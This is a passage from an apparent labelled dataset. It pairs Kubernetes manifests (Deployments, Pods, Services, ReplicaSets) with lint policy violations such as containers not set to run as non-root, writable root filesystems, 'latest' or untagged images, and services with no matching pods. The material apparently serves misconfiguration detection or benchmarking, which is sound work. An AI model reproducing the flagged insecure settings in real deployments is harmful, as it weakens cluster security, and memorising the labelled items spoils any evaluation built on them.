DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"obs\" is not set to runAsNonRoot"
  },
  {
    "id": "9043",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9044",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9045",
    "manifest_path": "data/manifests/the_stack_sample/sample_3407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8020\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9046",
    "manifest_path": "data/manifests/the_stack_sample/sample_3407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8020\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9047",
    "manifest_path": "data/manifests/the_stack_sample/sample_3407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8020\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9048",
    "manifest_path": "data/manifests/the_stack_sample/sample_3407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8020\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9049",
    "manifest_path": "data/manifests/the_stack_sample/sample_3407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8020\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9050",
    "manifest_path": "data/manifests/the_stack_sample/sample_3409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: skipper\n  labels:\n    app: skipper\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 7577\n  selector:\n    app: skipper\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:skipper])"
  },
  {
    "id": "9051",
    "manifest_path": "data/manifests/the_stack_sample/sample_3410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zeppelin-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zeppelin-operator\n  template:\n    metadata:\n      labels:\n        name: zeppelin-operator\n    spec:\n      serviceAccountName: zeppelin-operator\n      containers:\n      - name: zeppelin-operator\n        image: gcr.io/mapr-252711/zeppelin-operator:0.1.0\n        command:\n        - zeppelin-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zeppelin-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zeppelin-operator\" does not have a read-only root file system"
  },
  {
    "id": "9052",
    "manifest_path": "data/manifests/the_stack_sample/sample_3410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zeppelin-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zeppelin-operator\n  template:\n    metadata:\n      labels:\n        name: zeppelin-operator\n    spec:\n      serviceAccountName: zeppelin-operator\n      containers:\n      - name: zeppelin-operator\n        image: gcr.io/mapr-252711/zeppelin-operator:0.1.0\n        command:\n        - zeppelin-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zeppelin-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"zeppelin-operator\" not found"
  },
  {
    "id": "9053",
    "manifest_path": "data/manifests/the_stack_sample/sample_3410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zeppelin-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zeppelin-operator\n  template:\n    metadata:\n      labels:\n        name: zeppelin-operator\n    spec:\n      serviceAccountName: zeppelin-operator\n      containers:\n      - name: zeppelin-operator\n        image: gcr.io/mapr-252711/zeppelin-operator:0.1.0\n        command:\n        - zeppelin-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zeppelin-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zeppelin-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9054",
    "manifest_path": "data/manifests/the_stack_sample/sample_3410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zeppelin-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zeppelin-operator\n  template:\n    metadata:\n      labels:\n        name: zeppelin-operator\n    spec:\n      serviceAccountName: zeppelin-operator\n      containers:\n      - name: zeppelin-operator\n        image: gcr.io/mapr-252711/zeppelin-operator:0.1.0\n        command:\n        - zeppelin-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zeppelin-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zeppelin-operator\" has cpu request 0"
  },
  {
    "id": "9055",
    "manifest_path": "data/manifests/the_stack_sample/sample_3410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: zeppelin-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: zeppelin-operator\n  template:\n    metadata:\n      labels:\n        name: zeppelin-operator\n    spec:\n      serviceAccountName: zeppelin-operator\n      containers:\n      - name: zeppelin-operator\n        image: gcr.io/mapr-252711/zeppelin-operator:0.1.0\n        command:\n        - zeppelin-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: zeppelin-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"zeppelin-operator\" has memory limit 0"
  },
  {
    "id": "9056",
    "manifest_path": "data/manifests/the_stack_sample/sample_3413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1779\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9057",
    "manifest_path": "data/manifests/the_stack_sample/sample_3413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1779\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9058",
    "manifest_path": "data/manifests/the_stack_sample/sample_3413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1779\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9059",
    "manifest_path": "data/manifests/the_stack_sample/sample_3413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1779\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9060",
    "manifest_path": "data/manifests/the_stack_sample/sample_3413.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1779\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9061",
    "manifest_path": "data/manifests/the_stack_sample/sample_3414.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: http-whoami-headless\nspec:\n  clusterIP: None\n  selector:\n    app: http-whoami\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:http-whoami])"
  },
  {
    "id": "9062",
    "manifest_path": "data/manifests/the_stack_sample/sample_3415.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: named\n  labels:\n    name: named\nspec:\n  type: ClusterIP\n  selector:\n    app: named\n  ports:\n  - port: 80\n    targetPort: 8081\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:named])"
  },
  {
    "id": "9063",
    "manifest_path": "data/manifests/the_stack_sample/sample_3416.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jenkins2\n  namespace: jenkins2\n  labels:\n    app: jenkins2\nspec:\n  selector:\n    app: jenkins2\n  ports:\n  - name: web\n    port: 8080\n    targetPort: web\n  - name: agent\n    port: 50000\n    targetPort: agent\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jenkins2])"
  },
  {
    "id": "9064",
    "manifest_path": "data/manifests/the_stack_sample/sample_3417.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: nginx-replicaset-example\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      environment: test\n  template:\n    metadata:\n      labels:\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9065",
    "manifest_path": "data/manifests/the_stack_sample/sample_3417.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: nginx-replicaset-example\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      environment: test\n  template:\n    metadata:\n      labels:\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9066",
    "manifest_path": "data/manifests/the_stack_sample/sample_3417.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: nginx-replicaset-example\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      environment: test\n  template:\n    metadata:\n      labels:\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9067",
    "manifest_path": "data/manifests/the_stack_sample/sample_3417.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: nginx-replicaset-example\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      environment: test\n  template:\n    metadata:\n      labels:\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9068",
    "manifest_path": "data/manifests/the_stack_sample/sample_3417.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: nginx-replicaset-example\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      environment: test\n  template:\n    metadata:\n      labels:\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9069",
    "manifest_path": "data/manifests/the_stack_sample/sample_3418.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadtestclient\n  namespace: loadtest\n  labels:\n    app: loadtestclient\nspec:\n  replicas: 60\n  selector:\n    matchLabels:\n      app: loadtestclient\n  template:\n    metadata:\n      labels:\n        app: loadtestclient\n      annotations:\n        dapr.io/config: testappconfig\n        dapr.io/enabled: 'true'\n        dapr.io/app-id: loadtestclient\n        dapr.io/log-as-json: 'true'\n        dapr.io/enable-profiling: 'true'\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: agentpool\n                operator: In\n                values:\n                - loadgen\n      containers:\n      - name: loadtestclient\n        image: youngp/actorloadtest:dev\n        command:\n        - ./testclient\n        args:\n        - -a\n        - StateActor\n        - -c\n        - '10'\n        - -numactors\n        - '2048'\n        - -s\n        - '1024'\n        - -t\n        - 120m0s\n        - -m\n        - nop\n        ports:\n        - containerPort: 3000\n        imagePullPolicy: Always\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 60 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9070",
    "manifest_path": "data/manifests/the_stack_sample/sample_3418.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadtestclient\n  namespace: loadtest\n  labels:\n    app: loadtestclient\nspec:\n  replicas: 60\n  selector:\n    matchLabels:\n      app: loadtestclient\n  template:\n    metadata:\n      labels:\n        app: loadtestclient\n      annotations:\n        dapr.io/config: testappconfig\n        dapr.io/enabled: 'true'\n        dapr.io/app-id: loadtestclient\n        dapr.io/log-as-json: 'true'\n        dapr.io/enable-profiling: 'true'\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: agentpool\n                operator: In\n                values:\n                - loadgen\n      containers:\n      - name: loadtestclient\n        image: youngp/actorloadtest:dev\n        command:\n        - ./testclient\n        args:\n        - -a\n        - StateActor\n        - -c\n        - '10'\n        - -numactors\n        - '2048'\n        - -s\n        - '1024'\n        - -t\n        - 120m0s\n        - -m\n        - nop\n        ports:\n        - containerPort: 3000\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"loadtestclient\" does not have a read-only root file system"
  },
  {
    "id": "9071",
    "manifest_path": "data/manifests/the_stack_sample/sample_3418.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadtestclient\n  namespace: loadtest\n  labels:\n    app: loadtestclient\nspec:\n  replicas: 60\n  selector:\n    matchLabels:\n      app: loadtestclient\n  template:\n    metadata:\n      labels:\n        app: loadtestclient\n      annotations:\n        dapr.io/config: testappconfig\n        dapr.io/enabled: 'true'\n        dapr.io/app-id: loadtestclient\n        dapr.io/log-as-json: 'true'\n        dapr.io/enable-profiling: 'true'\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: agentpool\n                operator: In\n                values:\n                - loadgen\n      containers:\n      - name: loadtestclient\n        image: youngp/actorloadtest:dev\n        command:\n        - ./testclient\n        args:\n        - -a\n        - StateActor\n        - -c\n        - '10'\n        - -numactors\n        - '2048'\n        - -s\n        - '1024'\n        - -t\n        - 120m0s\n        - -m\n        - nop\n        ports:\n        - containerPort: 3000\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"loadtestclient\" is not set to runAsNonRoot"
  },
  {
    "id": "9072",
    "manifest_path": "data/manifests/the_stack_sample/sample_3418.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadtestclient\n  namespace: loadtest\n  labels:\n    app: loadtestclient\nspec:\n  replicas: 60\n  selector:\n    matchLabels:\n      app: loadtestclient\n  template:\n    metadata:\n      labels:\n        app: loadtestclient\n      annotations:\n        dapr.io/config: testappconfig\n        dapr.io/enabled: 'true'\n        dapr.io/app-id: loadtestclient\n        dapr.io/log-as-json: 'true'\n        dapr.io/enable-profiling: 'true'\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: agentpool\n                operator: In\n                values:\n                - loadgen\n      containers:\n      - name: loadtestclient\n        image: youngp/actorloadtest:dev\n        command:\n        - ./testclient\n        args:\n        - -a\n        - StateActor\n        - -c\n        - '10'\n        - -numactors\n        - '2048'\n        - -s\n        - '1024'\n        - -t\n        - 120m0s\n        - -m\n        - nop\n        ports:\n        - containerPort: 3000\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"loadtestclient\" has cpu request 0"
  },
  {
    "id": "9073",
    "manifest_path": "data/manifests/the_stack_sample/sample_3418.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadtestclient\n  namespace: loadtest\n  labels:\n    app: loadtestclient\nspec:\n  replicas: 60\n  selector:\n    matchLabels:\n      app: loadtestclient\n  template:\n    metadata:\n      labels:\n        app: loadtestclient\n      annotations:\n        dapr.io/config: testappconfig\n        dapr.io/enabled: 'true'\n        dapr.io/app-id: loadtestclient\n        dapr.io/log-as-json: 'true'\n        dapr.io/enable-profiling: 'true'\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: agentpool\n                operator: In\n                values:\n                - loadgen\n      containers:\n      - name: loadtestclient\n        image: youngp/actorloadtest:dev\n        command:\n        - ./testclient\n        args:\n        - -a\n        - StateActor\n        - -c\n        - '10'\n        - -numactors\n        - '2048'\n        - -s\n        - '1024'\n        - -t\n        - 120m0s\n        - -m\n        - nop\n        ports:\n        - containerPort: 3000\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"loadtestclient\" has memory limit 0"
  },
  {
    "id": "9074",
    "manifest_path": "data/manifests/the_stack_sample/sample_3423.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\nspec:\n  ports:\n  - port: 3306\n  selector:\n    name: harbor-mysql-apps\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:harbor-mysql-apps])"
  },
  {
    "id": "9075",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init-ds\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9076",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            